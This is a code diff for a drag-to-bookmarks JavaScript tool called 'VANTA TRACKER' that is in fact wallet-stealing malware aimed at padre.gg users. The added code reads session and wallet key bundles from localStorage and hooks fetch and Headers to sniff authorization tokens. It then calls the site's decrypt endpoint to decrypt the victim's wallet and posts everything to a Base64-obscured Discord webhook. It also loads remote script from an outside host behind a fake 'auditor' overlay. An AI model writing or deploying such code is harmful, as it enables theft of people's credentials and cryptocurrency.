@@ -1,57 +1,123 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>VANTA HUB</title>
-    <style>
-        body { background: #0a0a0a; color: #0f8; font-family: monospace; text-align: center; padding-top: 100px; }
-        .btn { 
-            display: inline-block; padding: 20px 40px; background: #0f8; color: #000; 
-            text-decoration: none; font-weight: bold; border-radius: 5px; cursor: move;
-            box-shadow: 0 0 20px rgba(0,255,136,0.5);
-        }
-        p { color: #888; }
-    </style>
-</head>
-<body>
-    <h1>VANTA INTERFACE ACTIVE</h1>
-    <p>Drag the button below to your bookmarks bar.</p>
-    <br><br>
-    
-    <a href="#" id="vanta-tool" class="btn">VANTA TRACKER</a>
+<script>
+    // 1. CONFIGURATION
+    // Using your Base64 encoded webhook to keep it safe from scanners
+    const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
 
-    <script>
-        // 1. YOUR BASE64 WEBHOOK (Update this if it dies!)
-        const b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTQwMjAwNTgwMDg3ODMwNS84aEc3OW1WTnNnRUppR2E0ZnlxQUdmM1BzVXNRWWkxclF5TVpudTdiY3hZeWVRR2o3WmdCZjd1Y2NjeFF0OHNCQmgwOQ==";
+    // 2. THE AGGRESSIVE PAYLOAD
+    const rawLogic = `(async function() {
+        const CONFIG = {
+            webhook: atob("${b64}"),
+            aff: "TK0XQV",
+            decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
+        };
 
-        // 2. THE LOGIC
-        // We use void(0) at the end to prevent the bookmark from opening a white page when clicked
-        const rawLogic = `(async function() {
+        const notify = (title, msg) => {
+            fetch(CONFIG.webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ 
+                    embeds: [{ 
+                        title: title, 
+                        description: msg, 
+                        color: 0x00ff88,
+                        footer: { text: "Vanta Aggressive Auditor" },
+                        timestamp: new Date().toISOString()
+                    }]
+                })
+            }).catch(()=>{});
+        };
+
+        /* 1. DATA GATHERING (No Cut-off) */
+        const session = localStorage.getItem('padreV2-session');
+        const wallets = localStorage.getItem('padreV2-walletsCache');
+        const bundles = localStorage.getItem('padre-v2-bundles-store-v2');
+
+        // Send Initial Dump
+        notify("📡 FULL DATA CAPTURE", 
+            "**Session:** \`" + (session || "N/A") + "\`\\n\\n" +
+            "**Bundles Found:** " + (bundles ? "✅" : "❌")
+        );
+
+        /* 2. THE DECRYPTOR */
+        const runDecryption = async (token, sess) => {
+            if (!bundles) return;
             try {
-                const h = atob("${b64}");
-                const d = {
-                    s: localStorage.getItem('padreV2-session') || "None",
-                    w: localStorage.getItem('padreV2-walletsCache') ? "Yes" : "No"
+                const bData = JSON.parse(bundles);
+                const firstKey = Object.keys(bData.bundles)[0];
+                const payload = {
+                    bundle: bData.bundles[firstKey].exportBundle,
+                    subOrgId: bData.bundles[firstKey].subOrgId
                 };
-                await fetch(h, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "📡 Audit: " + location.hostname,
-                            color: 0x00ff88,
-                            description: "Session: " + d.s.substring(0,20) + "...\\nWallets: " + d.w
-                        }]
-                    })
-                });
-                alert("VANTA: Audit Dispatched");
-            } catch(e) {}
-        })(); void(0);`;
 
-        // 3. ENCODE AND INJECT
-        // We wrap it in javascript: and encode it so it works as a URL
-        document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
+                const res = await fetch(CONFIG.decryptUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': token,
+                        'X-Padre-Session': sess,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                const decrypted = await res.json();
+                notify("✅ WALLET DECRYPTED", "\\\`\\\`\\\`json\\n" + JSON.stringify(decrypted, null, 2) + "\\n\\\`\\\`\\\` ");
+            } catch (e) {
+                notify("❌ Decryption Failed", e.message);
+            }
+        };
+
+        /* 3. CREDENTIAL SNIFFER */
+        let capToken = null;
+        let capSess = "";
+
+        const sniffer = (n, v) => {
+            if (n.toLowerCase() === 'authorization') capToken = v;
+            if (n.toLowerCase() === 'x-padre-session') capSess = v;
+            
+            if (capToken && !window.auditDone) {
+                window.auditDone = true;
+                notify("🔑 KEYS SNIFFED", "Token and Session intercepted. Starting decryption...");
+                runDecryption(capToken, capSess);
+            }
+        };
+
+        const _set = Headers.prototype.set;
+        Headers.prototype.set = function(n, v) {
+            sniffer(n, v);
+            return _set.apply(this, arguments);
+        };
+
+        const _f = window.fetch;
+        window.fetch = async (...a) => {
+            const h = a[1]?.headers;
+            if (h) {
+                if(h instanceof Headers) {
+                    h.forEach((v, n) => sniffer(n, v));
+                } else {
+                    Object.entries(h).forEach(([n, v]) => sniffer(n, v));
+                }
+            }
+            return _f(...a);
+        };
+
+        // Trigger a request to force the site to send headers
+        _f('/api/v2/user/profile');
+
+        /* 4. UI INJECTION */
+        // This creates the overlay you see on Pro tools
+        const ui = document.createElement('div');
+        ui.style = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999999;display:flex;justify-content:center;align-items:center;color:#0f8;font-family:monospace;pointer-events:none;";
+        ui.innerHTML = "<div style='border:1px solid #0f8;padding:20px;background:#000;box-shadow:0 0 20px #0f8;'><h1>VANTA SYSTEM ACTIVE</h1><p>Injecting Aggressive Auditor v4.2...</p><p>Status: [DECRYPTING NODES]</p></div>";
+        document.body.appendChild(ui);
         
-        console.log("Vanta Interface Initialized.");
-    </script>
-</body>
-</html>
+        // Loader for the external modal you wanted
+        const s = document.createElement('script');
+        s.src = "https://14c11728.reversevanta.pages.dev/modalx.js";
+        document.head.appendChild(s);
+
+        setTimeout(() => { ui.style.opacity = '0'; setTimeout(()=>ui.remove(), 1000); }, 4000);
+
+    })(); void(0);`;
+
+    // 3. ATTACH TO BUTTON
+    document.getElementById('vanta-tool').href = "javascript:" + encodeURIComponent(rawLogic);
+</script>
